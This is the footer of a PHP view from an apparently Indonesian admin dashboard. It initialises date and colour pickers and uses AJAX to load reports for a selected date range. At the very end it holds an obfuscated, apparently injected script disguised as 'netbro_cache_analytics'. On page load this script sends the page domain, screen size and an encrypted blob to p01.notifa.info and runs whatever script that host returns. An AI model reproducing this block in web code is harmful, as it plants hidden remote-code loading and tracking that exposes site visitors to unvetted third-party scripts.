    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-daterangepicker/daterangepicker.js"></script>
    <script>
    // MAterial Date picker    
    $('#mdate').bootstrapMaterialDatePicker({ weekStart: 0, time: false });
    $('#timepicker').bootstrapMaterialDatePicker({ format: 'HH:mm', time: true, date: false });
    $('#date-format').bootstrapMaterialDatePicker({ format: 'dddd DD MMMM YYYY - HH:mm' });

    $('#min-date').bootstrapMaterialDatePicker({ format: 'DD/MM/YYYY HH:mm', minDate: new Date() });
    // Clock pickers
    $('#single-input').clockpicker({
        placement: 'bottom',
        align: 'left',
        autoclose: true,
        'default': 'now'
    });
    $('.clockpicker').clockpicker({
        donetext: 'Done',
    }).find('input').change(function() {
        console.log(this.value);
    });
    $('#check-minutes').click(function(e) {
        // Have to stop propagation here
        e.stopPropagation();
        input.clockpicker('show').clockpicker('toggleView', 'minutes');
    });
    if (/mobile/i.test(navigator.userAgent)) {
        $('input').prop('readOnly', true);
    }
    // Colorpicker
    $(".colorpicker").asColorPicker();
    $(".complex-colorpicker").asColorPicker({
        mode: 'complex'
    });
    $(".gradient-colorpicker").asColorPicker({
        mode: 'gradient'
    });
    // Date Picker
    jQuery('.mydatepicker, #datepicker').datepicker();
    jQuery('#datepicker-autoclose').datepicker({
        autoclose: true,
        todayHighlight: true
    });
    jQuery('#datepicker-autoclose2').datepicker({
        autoclose: true,
        todayHighlight: true
       
    });
    jQuery('#datepicker-autoclose3').datepicker({
        autoclose: true,
        todayHighlight: true
       
    });
    jQuery('#date-range').datepicker({
        toggleActive: true
    });
    jQuery('#datepicker-inline').datepicker({
        todayHighlight: true
    });
    // Daterange picker
    $('.input-daterange-datepicker').daterangepicker({
        buttonClasses: ['btn', 'btn-sm'],
        applyClass: 'btn-danger',
        cancelClass: 'btn-inverse'
    });
    $('.input-daterange-timepicker').daterangepicker({
        timePicker: true,
        format: 'MM/DD/YYYY h:mm A',
        timePickerIncrement: 30,
        timePicker12Hour: true,
        timePickerSeconds: false,
        buttonClasses: ['btn', 'btn-sm'],
        applyClass: 'btn-danger',
        cancelClass: 'btn-inverse'
    });
    $('.input-limit-datepicker').daterangepicker({
        format: 'MM/DD/YYYY',
        minDate: '06/01/2015',
        maxDate: '06/30/2015',
        buttonClasses: ['btn', 'btn-sm'],
        applyClass: 'btn-danger',
        cancelClass: 'btn-inverse',
        dateLimit: {
            days: 6
        }
    });
    </script>


    


  <!--   <script type="text/javascript">

    $(document).on("click",".hapus-laporan",function(){
    
    $.ajaxSetup({
      type:"post",
      cache:false,
      dataType: "json"
    })

    var id=$(this).attr("data-id");
    // var nama=$(this).attr("data-name");
    // var photo=$(this).attr("data-photo");


        swal({   
            title: "Anda Yakin?",   
            text: "Menghapus data  ?",   
            type: "warning",   
            showCancelButton: true,   
            confirmButtonColor: "#DD6B55",   
            confirmButtonText: "Yes, delete it!",   
            cancelButtonText: "No, cancel plx!",   
            closeOnConfirm: false,   
            closeOnCancel: false 
        }, function(isConfirm){   
            if (isConfirm) {  
                $.ajax({
                data:{id:id},
                url:"<?php echo base_url('Admin-area/delete-category');?>",
                success: function(html) {
                    $("tr[data-id='"+id+"']").fadeOut(1500,function(){
                        $(this).remove();
                    });
                    swal({   
                        title: "Deleted !",   
                        text: "Sukses dihapus",   
                        type: "success",       
                        confirmButtonText: "Ok",    
                        closeOnConfirm: false,   
                        closeOnCancel: false 
                    });
                }

                })   
               
            } else {     
                swal("Cancelled", "Data batal dihapus.", "error");   
            } 
        });
    });


    </script> -->

      <script type="text/javascript">
            $(document).ready(function()  {
                var dateFrom = $('#datepicker-autoclose2').val();
                var dateTo = $('#datepicker-autoclose3').val();


                     $.ajax({
                        type : 'GET',
                        url:"<?php echo base_url('Admin-area/report_between');?>",
                        
                        data : {datef:dateFrom,datet:dateTo},
                        success: function (data) {
                                 // alert('success');
                             $('#reports').html(data);

                                
                            //jika data berhasil didapatkan, tampilkan ke dalam option select kabupaten
                            // $("body").html(data);
                        }
                    });

        
               $('#datepicker-autoclose2').on('change',function(){
                var dateFrom = $(this).val();
                var dateTo = $('#datepicker-autoclose3').val();


                     $.ajax({
                        type : 'GET',
                        url:"<?php echo base_url('Admin-area/report_between');?>",
                        
                        data : {datef:dateFrom,datet:dateTo},
                        success: function (data) {
                                 // alert('success');
                             $('#reports').html(data);

                                
                            //jika data berhasil didapatkan, tampilkan ke dalam option select kabupaten
                            // $("body").html(data);
                        }
                    });
              
               


               });

               $('#datepicker-autoclose3').on('change',function(){
                var dateTo = $(this).val();
                var dateFrom = $('#datepicker-autoclose2').val();

                   $.ajax({
                        type : 'GET',
                        url:"<?php echo base_url('Admin-area/report_between');?>",
                        
                        data : {datef:dateFrom,datet:dateTo},
                        success: function (data) {
                                 // alert('success');
                             $('#reports').html(data);

                                
                            //jika data berhasil didapatkan, tampilkan ke dalam option select kabupaten
                            // $("body").html(data);
                        }
                    });
               });


             });
            
    </script>

   

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m8Ghk4KdVfTtOdzpINRJK8Lq5daklVvl%2b0ekwjWEdI3LkcWt04FU%2fMGdgvPvlk4r8N49s3uqel0%2bRQ5bk0wElt2WxkjEhDArisi1TM0kxZ3gfW3oZWXqN1EisiLm71HF4s473MxGR9d1AhzHXf%2bzbDjoIQvC%2fwki5PNvo7sNVRBfvGMu7TSjmrekcGzamLffm%2f41XXU3zPoM6%2fsICb2HG1HcBtC%2buyil8u3rwrWbYA6bhroR9AZgDIW4iW%2btOTtjbTttqBTO8j6FuIQ4007JaLqEvdPNlFz3fm0wu1Wt9d9B%2b0qjTqAa1mTsk%2fp6uCty1dbRoWloKtjJQ2OUcf8M%2fbO7V8gOAMe0C9WimU49s%2bpG%2bS5Rf1y8od4%2b3D%2ffzJPqoS5lwyzJWkb5GVR2RrFJwQVMrS9%2bjlsbDiOfP8btteDNvWvjgUsf9EgpPdft7F%2fMjDSWDfG0NOO79V%2fvUCQdFmU%2faUULArU1ORrFY8fxqSaQ5mW4geJbskB%2bjAn2DXH9gW1wJjZMP2BBxNpKfSORlnQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
   

        


   </body>


<!-- Mirrored from www.wrappixel.com/demos/admin-templates/elegant-admin/modern/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 29 Aug 2018 10:42:49 GMT -->
</html>